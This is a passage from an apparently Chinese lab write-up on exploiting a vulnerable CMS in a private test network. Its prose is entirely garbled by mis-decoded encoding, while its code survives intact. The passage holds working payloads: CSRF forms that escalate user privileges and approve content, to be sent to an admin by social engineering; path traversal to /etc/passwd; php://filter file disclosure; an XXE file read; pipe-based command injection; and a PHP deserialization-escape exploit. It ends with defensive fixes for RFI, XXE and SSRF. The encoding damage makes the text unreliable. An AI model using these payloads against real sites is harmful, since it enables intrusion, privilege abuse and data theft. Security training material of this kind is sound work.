ç­‰ã€‚ç„¶è€Œå¦‚æœæ”»å‡»è€…è·å–äº†æ›´æ”¹ç”¨æˆ·ç­‰çº§çš„è¡¨å•å°±å¯ä»¥ç²¾å¿ƒæ„é€ å‡ºä¸€ä¸ªç½‘é¡µï¼ˆburpå¯ä»¥ä¸€é”®ç”Ÿæˆï¼‰ï¼Œè¿™ä¸ªç½‘é¡µçš„åŠŸèƒ½å¯ä»¥å°†ä¼šå‘˜ä¿®æ”¹ä¸ºæ”»å‡»è€…æƒ³è¦çš„ç­‰çº§ï¼Œæˆ–è€…æ˜¯æ·»åŠ ç®¡ç†å‘˜ã€‚æ­¤æ—¶å¦‚æœç®¡ç†å‘˜ä¸å°å¿ƒç‚¹å‡»äº†è¿™ä¸ªé“¾æ¥ï¼Œæµè§ˆå™¨å¸¦ç€ç®¡ç†å‘˜ç™»å½•æ—¶çš„cookieè®¿é—®äº†è¯¥é“¾æ¥ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±è®¤ä¸ºä¿®æ”¹ä¼šå‘˜ç­‰çº§çš„æ“ä½œæ˜¯ç®¡ç†å‘˜æœ¬äººï¼Œæ‰§è¡Œè¯¥æ“ä½œï¼Œä»è€Œé€ æˆæ”»å‡»ã€‚ ä½¿ç”¨bpæŠ“å–è¯¥è¡¨å• username=szy&amp;nickname=szy&amp;mobile=17856276754&amp;email=263233%40qq.com&amp;password=&amp;groupid=2&amp;point=0&amp;vip=0&amp;overduedate=1970-01-01+08%3A00%3A00&amp;id=1 æäº¤çš„æ•°æ®ä¸­å¯ä»¥ä¿®æ”¹groupid, point, vip ä½¿ç”¨bpä¸€é”®ç”Ÿæˆæ”»å‡»ç½‘é¡µ ç”Ÿæˆçš„å†…å®¹ä¸º &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;mobile&quot; value=&quot;17856276754&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;263233&amp;#64;qq&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;groupid&quot; value=&quot;5&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;point&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;vip&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;overduedate&quot; value=&quot;1970&amp;#45;01&amp;#45;01&amp;#32;08&amp;#58;00&amp;#58;00&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; å¤åˆ¶ä¸Šé¢çš„é“¾æ¥ï¼Œä½¿ç”¨ç¤¾å·¥çš„æ–¹æ³•å‘é€ç»™adminï¼Œå¦‚æœä»–åœ¨å¤„äºç™»å½•çŠ¶æ€æ—¶ç‚¹å‡»é‚£ä¹ˆæ”»å‡»å°±æˆåŠŸäº†ã€‚ ç‚¹å‡»Submit requestï¼Œå°±ä¼šå‡ºç°æ›´æ–°æˆåŠŸçš„æç¤ºã€‚æŸ¥çœ‹szyï¼Œç¡®è®¤å…¶ç­‰çº§å˜åŒ– å¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·çš„ç­‰çº§å·²ç»å˜æˆäº†é«˜çº§ä¼šå‘˜ï¼Œå¹¶ä¸”ç§¯åˆ†ç‚¹æ•°ä¹Ÿå˜æˆäº†1000ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚ æ¼æ´ç‚¹ä¸‰åŒæ ·æ˜¯åœ¨è¿™ä¸ªé¡µé¢ï¼Œæœ‰ä¸€ä¸ªâ€æ·»åŠ â€é¡µé¢ï¼ŒåŒæ ·ä¹Ÿæ˜¯å­˜åœ¨CSRFæ¼æ´ï¼Œå¦‚æœè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œåˆ™å¯ä»¥åˆ›é€ å‡ºå¤§é‡çš„æ— ç”¨è´¦å·ï¼Œä»è€Œæµªè´¹æœåŠ¡å™¨çš„èµ„æºï¼Œå¯èƒ½é€ æˆdosæ”»å‡»ã€‚ æ¼æ´ç‚¹å››å†…å®¹-&gt;ç¨¿ä»¶ç®¡ç†-&gt;é€šè¿‡å®¡æ ¸ï¼Œè¿™é‡Œä¼šæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·æäº¤çš„ç¨¿ä»¶ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æäº¤äº†ä¸€ä¸ªå«æœ‰æ¶æ„ä»£ç çš„ç¨¿ä»¶ï¼Œåˆæƒ³åœ¨adminä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è®©è¿™ä¸ªç¨¿ä»¶é€šè¿‡å®¡æ ¸ï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„é“¾æ¥å‘é€ç»™adminï¼Œ å†…å®¹å¦‚ä¸‹ &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/cms/publish/pass.html&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ids&amp;#91;&amp;#93;&quot; value=&quot;4&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; å½“adminç‚¹å‡»åï¼Œå°±ä¼šè®©ç¨¿ä»¶é€šè¿‡å®¡æ ¸ 11.ä»»æ„æ–‡ä»¶ä¸‹è½½é¦–é¡µä¸­å­˜åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸‹è½½æ¨¡å—ï¼Œå¯ä»¥ä¸‹è½½è‡ªå·±å–œæ¬¢çš„çƒæ˜Ÿå£çº¸ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹æäº¤çš„æ•°æ® å°è¯•ä¸‹è½½/etc/passwdæ–‡ä»¶ï¼Œè¾“å…¥ filename=/etc/passwd ä½†æ˜¯å‡ºç°æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼ å°è¯•å¤šè¾“å…¥å‡ ä¸ª../ filename=../../../../../etc/passwd æˆåŠŸè·å–åˆ°/etc/passwdæ–‡ä»¶å†…å®¹ é‚£ä¹ˆå°±å¯ä»¥ç»“åˆRCEæ¼æ´ï¼Œè·å–åˆ°è¯¥æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ é¦–å…ˆåˆ©ç”¨RCEæ¼æ´è·å–åˆ°æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œä¹‹åé…åˆè¯¥æ¼æ´å³å¯å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚ 12.unserializeè¯¥æ¼æ´å°±æ˜¯ä¸€ä¸ªCTFé¢˜ç›®ï¼Œä½†æ˜¯æºç éœ€è¦åˆ©ç”¨å‰é¢çš„æ¼æ´è·å– é“¾æ¥:http://192.168.164.147/ctf/index æ ¹æ®æç¤ºæ˜¯ä¸€ä¸ªctfé¢˜ç›®ï¼Œé‚£ä¹ˆåº”è¯¥ä¹Ÿç¬¦åˆä¸€èˆ¬ctfä¸­webé¢˜ç›®çš„å¥—è·¯ã€‚ é¦–å…ˆæŸ¥çœ‹æºç  ï¼Œè·å–æç¤º ä½†æ˜¯ä¸€èˆ¬çš„ååºåˆ—åŒ–æ¼æ´çš„é¢˜ç›®éƒ½æ˜¯æœ‰æºç çš„ï¼Œåªæœ‰æ ¹æ®æºç æ‰èƒ½å†™å‡ºEXPã€‚ æ—¢ç„¶æ²¡æœ‰æºç ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¹‹å‰å‘ç°çš„æ¼æ´è·å–æºç ã€‚ æœ‰äº”ç§è·å–æºç çš„æ–¹æ³• æ–‡ä»¶ä¸Šä¼  ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬åï¼Œå¯ä»¥æ§åˆ¶æœåŠ¡å™¨ï¼Œå¯ä»¥ç›´æ¥åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸­ä¸‹è½½æ–‡ä»¶ LFI ä½¿ç”¨php://filterï¼Œåœ¨æ–‡ä»¶åŒ…å«æ¼æ´çš„ä½ç½®è·å–base64æºç  payloadï¼š http://192.168.164.147:81/contact/index?file=php://filter/convert.base64-encode/resource=unserialize.php XXE åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ è·å–çš„è·¯åŠ² payload &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///var/www/public/unserialize.php&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;info&gt;das&lt;/info&gt;&lt;/user&gt; ä»»æ„æ–‡ä»¶ä¸‹è½½ ç‚¹å‡»å³å¯ä¸‹è½½åˆ°æ–‡ä»¶ RCE é¦–å…ˆ åˆ—å‡ºç›®å½• 127.0.0.0 | ls è¯»å–æ–‡ä»¶ 127.0.0.0 | cat unserialize.php æºç å¦‚ä¸‹ &lt;?php error_reporting(0); class a &#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; echo &quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;ç»§ç»­åŠ æ²¹&#x27;)&lt;/script&gt;&quot;; &#125; &#125; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $uname=$_POST[&#x27;payload&#x27;]; $password=1; $ser=filter(serialize(new a($uname,$password))); $test=unserialize($ser); ?&gt; å¼€å§‹è§£é¢˜ è€ƒå¯Ÿç‚¹æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ å…ˆä»ç®€å•çš„PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸äº†è§£ä»€ä¹ˆæ˜¯ååºåŒ–é€ƒé€¸ã€‚ &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); $res=filter(serialize($AA)); $c=unserialize($res); echo $c-&gt;pass; ?&gt; åˆ©ç”¨ååºåˆ—åŒ–é€ƒé€¸ä¿®æ”¹passçš„å€¼ã€‚ æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœ O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; s:4:&quot;aaaa&quot;såé¢çš„æ•°å­—è¡¨ç¤ºå˜é‡çš„é•¿åº¦ï¼Œphpæ‰§è¡Œçš„æ—¶å€™ä¼šæ ¹æ®å…¶é•¿åº¦è¯»å–æ•°æ®ï¼Œå¦‚æœä¸ç¬¦åˆè§„åˆ™åˆ™ä¼šååºåˆ—åŒ–å¤±è´¥ã€‚ ä¾‹å¦‚ O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; å°†4æ”¹ä¸º5ï¼Œé‚£ä¹ˆåˆ™è®¤ä¸ºnameçš„å€¼ä¸º aaaa&quot;,æ­¤æ—¶å› ä¸ºå‰é¢çš„â€æ— æ³•é—­åˆè€Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚ è€Œä¸Šé¢çš„ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªæ›¿æ¢å‡½æ•°ï¼Œåªè¦nameä¸­å­˜åœ¨bbåˆ™å°†å…¶æ›¿æ¢ä¸ºcccï¼Œå¯¼è‡´nameå­—æ®µçš„é•¿åº¦ä¼šå¢åŠ 1ï¼Œæˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æ„é€ å‡ºæƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚æƒ³å°†passå˜é‡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹ &quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; å…¶ä¸­ å‰é¢çš„ â€œ;æ˜¯ä¸ºäº†é—­åˆçš„å˜é‡çš„â€ï¼Œä¿è¯è¯­æ³•æ­£ç¡®ï¼Œ}çš„ä½œç”¨æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿— ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º27ï¼Œæ‰€ä»¥å°±éœ€è¦27ä¸ªbbæ¥äº§ç”Ÿ27ä¸ªå­—ç¬¦é•¿åº¦çš„é€ƒé€¸ &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); var_dump(serialize($AA)); $res=filter(serialize($AA)); var_dump($res); $c=unserialize($res); echo $c-&gt;pass; //echo unserialize($AA); //&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; ?&gt; //ç»“æœå¦‚ä¸‹ ||ä¸ºå¯¹é½ /* string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;|| string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot; hacker */ è¿™é‡Œpassçš„å€¼å°±è¢«è¯¥ç§°äº†hacker æ€»ç»“ï¼šé€ƒé€¸æˆ–è€…è¯´è¢«â€œé¡¶â€å‡ºæ¥çš„payloadå°±ä¼šè¢«å½“åšå½“å‰ç±»çš„å±æ€§è¢«æ‰§è¡Œã€‚ è€Œé’ˆå¯¹è¿™é“é¢˜ï¼Œä»£ç çš„æ„æ€å¤§è‡´ä¸ºï¼ŒPOSTæäº¤ä¸€ä¸ªuanmeï¼Œpasswordé»˜è®¤ä¸º1ï¼Œä¹‹åç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¹¶å°†å­—ç¬¦ä¸²ä¸­çš„challengeæ¢æˆeasychallengeï¼Œå­—ç¬¦é•¿åº¦å¢åŠ 4ï¼Œå½“å¯†ç ä¸ºeasyæ—¶ï¼Œå¾—åˆ°flagã€‚è¿™é¢˜çœ‹ä¸Šå»ä¸ä¸Šé¢çš„ä¾‹å­å·®ä¸å¤šï¼Œä½†æ˜¯æ„é€ çš„æ—¶å€™å‘ç°å¹¶ä¸æ˜¯ éœ€è¦æ„é€ çš„å±æ€§ len(&quot;;s:4:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;) =29 å¯ä»¥å‘ç°ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º29ï¼Œè€Œæ¯æ›¿æ¢ä¸€ä¸ªchallengeåªèƒ½é€ƒé€¸å‡º4ä¸ªå­—ç¬¦ï¼Œä¸èƒ½æ„é€ å‡º29ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å†æ„é€ å‡ºä¸€ä¸ªå±æ€§ï¼Œä½¿ä¸Šé¢çš„å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º4çš„å€æ•°ã€‚ &quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; ä¸Šé¢æ„é€ å‡ºçš„payloadé•¿åº¦ä¸º48å› æ­¤è¿˜éœ€è¦12ä¸ªchallengeã€‚ expå¦‚ä¸‹ &lt;?php class a &#123; public $uname=&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;; public $password=&quot;1&quot;; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $ser=filter(serialize(new a($uname,$password))); echo($ser); ?&gt; è¾“å‡ºçš„ç»“æœï¼š O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:156:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; //easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge é•¿åº¦ä¸º156 finalpayloadï¼š challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; æäº¤payloadï¼Œè·å–flag æ¼æ´ä¿®å¤1.RFIä»£ç åˆ†æä»£ç ä½ç½®application\\employee\\controller\\Index.php public function index() &#123; $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; include &quot;$file&quot;; $info = []; $info = $info_1; return $this-&gt;fetch(&#x27;index&#x27;, [&#x27;info&#x27; =&gt; $info]); return view(); &#125; è¿™ä¸ªä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯åŒ…å«äº†info.phpæ–‡ä»¶æŒ‰ï¼Œå¹¶è·å–å…¶ä¸­çš„$infoå‚æ•°ï¼Œç„¶åå‘é€ç»™å‰ç«¯ï¼Œç„¶ååœ¨å‰ç«¯æ˜¾ç¤ºå†…å®¹ã€‚ä½†æ˜¯ä¹Ÿå¾ˆå±é™©ï¼Œå› ä¸ºæœ‰includeå‡½æ•°çš„å­˜åœ¨ï¼Œæ‰€ä»¥å­˜åœ¨RFIï¼Œè€Œä¸”å¯¹æäº¤çš„å‚æ•°æ²¡æœ‰ä»»ä½•çš„æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨ æ¼æ´é˜²å¾¡ æ–¹æ³•ä¸€ ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­æ·»åŠ  allow_url_open = off allow_url_include = off æ„æˆRFIæ¼æ´çš„æ¡ä»¶ååˆ†è‹›åˆ»ï¼Œåªæœ‰php.iniä¸­ä¸Šé¢ä¸¤ä¸ªé…ç½®é¡¹éƒ½æ²¡offæ‰èƒ½åˆ©ç”¨è¯¥æ¼æ´ã€‚ æ–¹æ³•äºŒ åœ¨ä»£ç ä¸­é™åˆ¶æäº¤ä¸Šçš„æ–‡ä»¶åï¼Œå› ä¸ºåªéœ€è¦åŒ…å«about.phpï¼Œæ‰€ä»¥æ£€æŸ¥æäº¤ä¸Š$fileæ˜¯å¦ä¸ºabout.php $file = @$_GET[&#x27;file&#x27;]; if (!isset($file) || $file == &#x27;&#x27;) &#123; $file = &#x27;info.php&#x27;; &#125; if($file !== &quot;info.php&quot;)&#123; return $this-&gt;error(&quot;æ–‡ä»¶åé”™è¯¯ï¼&quot;) &#125; include &quot;$file&quot;; 2.XXEä»£ç åˆ†æä»£ç ä½ç½®application\\advice\\controller\\Index.php public function index() &#123; $result = null; $code = 0; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if($xmlfile !== &quot;&quot;)&#123; $dom = new DOMDocument(); // var_dump($dom); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $info = $creds-&gt;info; $conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;yzncms&quot;); if (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error()); &#125; $sql = &quot;INSERT INTO yzn_new (name, info) values(&#x27;$username&#x27;,&#x27;$info&#x27;)&quot;; if($conn-&gt;query($sql))&#123; $code = 1; echo &quot;&lt;script&gt;alert(&#x27;æäº¤æˆåŠŸï¼&#x27;)&lt;/script&gt;&quot;; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125; å‰ç«¯ä»£ç  var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;info&gt;&quot; + info + &quot;&lt;/info&gt;&lt;/user&gt;&quot;; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;/advice/index&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; if(code === &quot;0&quot;)&#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;); &#125;else &#123; $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;); &#125; &#125;, &#125;); ä¸Šé¢çš„ä¸¤ç«¯ä»£ç ï¼Œä¸€ä¸ªæ˜¯å‰ç«¯çš„æ•°æ®ä¼ é€ï¼Œä¸€ä¸ªæ˜¯åç«¯çš„æ•°æ®å¤„ç† å¯ä»¥çœ‹åˆ°å‰ç«¯å°†ç”¨æˆ·æäº¤çš„æ•°æ®ä¸€xmlæ ¼å¼ä»¥postæ–¹å¼å‘é€ç»™åç«¯ï¼Œè€Œåœ¨åç«¯ä¸­ä½¿ç”¨äº†$xmlfile = file_get_contents(&#39;php://input&#39;);ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¸ä»…ä½¿ç”¨äº†file_get_contentsï¼Œè€Œä¸”ä½¿ç”¨äº†phpä¼ªåè®®php://inputï¼Œè¿™ä¸ªåè®®å¯ä»¥è¯»å–ç”¨æˆ·ç”¨postæ–¹å¼æäº¤çš„æ•°æ®ï¼Œè¿™å°±æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æŠ“åŒ…çš„æ–¹å¼ä¿®æ”¹è‡ªå·±æ‰€æäº¤çš„æ•°æ®ï¼Œä»è€Œå¼•å…¥å¤–éƒ¨å®ä½“ï¼Œé€ æˆXXEæ¼æ´ï¼Œè€Œæœ€ä¸»è¦çš„åŸå› æ˜¯è¿™æ®µä»£ç ï¼Œè¿™ä¸ªå‡½æ•°å‚æ•°ä¼ªtrueæ—¶ï¼Œå°±æ˜¯ç¦æ­¢å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œè€Œè¿™é‡Œé€‰æ‹©äº†false libxml_disable_entity_loader(false) æ¼æ´é˜²å¾¡ æ–¹æ³•ä¸€ ä½¿ç”¨æ‰€å¼€å‘çš„è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• phpä¸­çš„æ˜¯ ä¹Ÿå°±æ˜¯è¿™ä¸ªæ¼æ´çš„é˜²å¾¡æ–¹æ³• libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) æ–¹æ³•äºŒ ä»£ç å±‚é¢çš„é˜²å¾¡ï¼Œåœ¨ä»£ç ä¸­æ·»åŠ å¯¹ç”¨æˆ·æäº¤æ•°æ®çš„æ£€æµ‹å‡½æ•° æ¯”å¦‚ &lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLIC ä¸Šé¢çš„å…³é”®è¯æ˜¯XMlå®ä½“ä¸­ä¸å¯ç¼ºå°‘çš„å…³é”®è¯ï¼Œæ‰€ä»¥è¿‡æ»¤åï¼Œå¯ä»¥å¤§æ¦‚ç‡çš„é˜²æ­¢XXEæ”»å‡» 3.SSRFä»£ç åˆ†æä»£ç ä½ç½®application\\info\\controller\\Index.php public function index() &#123; $url = @$_GET[&#x27;url&#x27;]; if (!isset($url) || $url == &#x27;&#x27;) &#123; $url = &#x27;https://sunzy.icu&#x27;; &#125; $url = &#x27;https://sunzy.icu&#x27;; if ($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $co = curl_exec($ch); curl_close($ch); echo $co; &#125; // return view(); &#125; åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œéœ€è¦æ¥æ”¶ä¸€ä¸ªå‚æ•°urlï¼Œå¦‚æœå‚æ•°ä¸ºç©ºï¼Œåˆ™èµ‹å€¼ä¸ºhttps://sunzy.icuï¼Œå¦åˆ™ç›´æ¥è¿›è¡Œcurlåˆå§‹åŒ–ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹æäº¤çš„å‚æ•°è¿›è¡Œä»»ä½•çš„æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œè¿™æ˜¯å¾ˆå±é™©çš„ã€‚ æ¼æ´é˜²å¾¡ æ–¹æ³•ä¸€ é»‘åå• å†…ç½‘è¿‡æ»¤ï¼Œç«¯å£é™åˆ¶ï¼Œåè®®é™åˆ¶åªå…è®¸ä½¿ç”¨http/https åœ¨è¿™ä¸ªç³»ç»Ÿä¸­é˜²å¾¡è¯¥SSRFæ¼æ´å…¶å®éå¸¸ç®€å•ï¼Œå°±æ˜¯ç¦æ­¢æäº¤å‚æ•°ï¼Œæˆ–è€…ç»‘å®šå‚æ•°ä»£ç å¦‚ä¸‹ function check_inner_ip($url) &#123; //åªå…è®¸httpå’Œhttpsåè®® $match_result = preg_match(&#x27;/^(http|https)?:\\/\\/.*(\\/)?.*$/&#x27;, $url); if (!$match_result) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; try &#123; $url_parse = parse_url($url); &#125; catch (Exception $e) &#123; return $this-&gt;error(&#x27;url fomat error&#x27;); &#125; $hostname = $url_parse[&#x27;host&#x27;]; $ip = gethostbyname($hostname); $int_ip = ip2long($ip); //ä¸å…è®¸hostä¸ºå†…ç½‘ipåœ°å€ return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == $int_ip &gt;&gt; 24 || ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == $int_ip &gt;&gt; 20 || ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == $int_ip &gt;&gt; 16; &#125; æ–¹æ³•äºŒ å¯¹äºä¸€èˆ¬çš„SSRFé˜²å¾¡ï¼Œä¸€èˆ¬ä»ä¸€ä¸‹å‡ æ–¹é¢å…¥æ‰‹ é™åˆ¶åè®®ä¸ºHTTPã€HTTPS ä¸ç”¨é™åˆ¶302é‡å®šå‘ è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IP 